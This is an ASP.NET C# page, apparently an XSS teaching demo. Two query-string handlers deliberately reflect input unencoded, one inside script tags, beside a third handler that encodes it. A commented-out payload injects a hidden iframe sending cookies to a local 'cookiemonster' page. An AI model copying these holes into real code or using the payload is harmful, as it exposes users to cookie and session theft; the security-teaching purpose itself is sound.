using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.Configuration;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CrossSiteScripting
{
    public partial class master : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

            FakeCookies();
            string strQs = string.Empty;
            //Reflexive XSS
            if (Request.QueryString["strErr"] != null)
            {
                strQs = Request.QueryString["strErr"] as string;
                lblDisplayErr.Text = strQs;
                //lblDisplayErr.Text = "<script> var s = '<IFRAME style = \"display:none\" SRC = \"http://localhost:62460/cookiemonster.aspx?c=test\" ></ IFRAME > ';document.write(s)</script>";

            }
            //Reflexive XSS bypass validate request
            if (Request.QueryString["strErr2"] != null)
            {
                strQs = Request.QueryString["strErr2"] as string;
                lblDisplayErr.Text = "<script>"+strQs+"</script>";
            }
            //Stop XSS attack by encoding
            if (Request.QueryString["strErr3"] != null)
            {
                strQs = Request.QueryString["strErr3"] as string;
                lblDisplayErr.Text = Server.HtmlEncode(strQs);
            }
            
            ReadFromCookies();
            lblDisplayErr.Dispose();
        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            Response.Redirect("ListComments.aspx?cid=" + Server.UrlEncode(prodId.Text));
        }

        void ReadFromCookies()
            {
                lblCookies.Text = string.Empty;
                if (Response.Cookies["name"] != null)
                {
                    HttpCookie aCookie = Request.Cookies["name"];
                    if (!string.IsNullOrEmpty(aCookie.Value))
                    {
                        lblCookies.Text = "Data from cookies:" + aCookie.Value;
                    }
                }

            }

            //Create cookies to steal!
            void FakeCookies()
            {
                Response.Cookies["name"].Value = "Kyle";
                Response.Cookies["name"].Expires = DateTime.Now.AddDays(1);
                Response.Cookies["age"].Value = "23";
                Response.Cookies["age"].Expires = DateTime.Now.AddDays(1);


            }
        }
}